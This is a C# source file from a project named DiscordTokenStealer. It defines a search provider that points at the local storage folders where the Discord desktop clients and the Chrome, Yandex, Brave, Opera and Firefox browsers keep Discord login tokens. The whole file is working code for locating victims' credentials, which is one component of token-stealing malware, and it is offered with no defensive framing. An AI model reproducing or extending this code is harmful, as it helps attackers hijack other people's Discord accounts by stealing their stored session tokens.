using DiscordTokenStealer.Helpers;

namespace DiscordTokenStealer.DirectorySearchProviders;

public partial class AppDataSearchProvider : IDirectorySearchProvider
{
    private AppDataSearchProvider(string directory, string searchPattern = "*.ldb")
    {
        Directory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), directory);
        Pattern = searchPattern;
    }

    public string Directory { get; }
    public string Pattern { get; }
}

public partial class AppDataSearchProvider
{
    #region Discord Clients

    public static readonly AppDataSearchProvider Discord = new("discord\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider DiscordPtb = new("discordptb\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider DiscordCanary = new("discordcanary\\Local Storage\\leveldb");

    #endregion


    #region Browsers

    public static readonly AppDataSearchProvider Chrome =
        new("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider Yandex =
        new("Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider Brave =
        new("BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider Opera =
        new("Opera Software\\Opera Stable\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider? Firefox =
        DirectoryHelper.TryFindSubDirectory(
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla\\Firefox\\Profiles"), "storage\\default\\https+++discord.com\\ls", out var dir) && dir != null
            ? new AppDataSearchProvider(dir, "*.sqlite")
            : null;

    #endregion
}